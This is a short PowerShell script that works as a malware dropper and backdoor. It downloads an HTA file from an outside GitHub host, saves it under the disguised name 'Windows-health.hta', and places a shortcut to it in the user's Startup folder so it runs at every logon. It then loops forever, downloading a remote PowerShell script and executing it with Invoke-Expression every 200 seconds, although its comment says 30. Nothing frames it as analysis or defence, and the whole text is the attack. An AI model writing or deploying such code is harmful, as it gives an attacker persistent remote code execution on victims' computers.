(Invoke-WebRequest -Uri "https://raw.githubusercontent.com/HAXORK8880/files/main/code.hta").Content | Out-File "$env:userprofile\Windows-health.hta"
# Create shortcut to HTA file in Startup folder
$Shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Windows-health.lnk")
$Shortcut.TargetPath = "$env:USERPROFILE\Windows-health.hta"
$Shortcut.Save()
 

# Loop to run PowerShell script every 30 seconds
while ($true) {
    Start-Sleep -Seconds 200
    Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/HAXORK8880/servers/main/Tr_446_server.ps1')
}
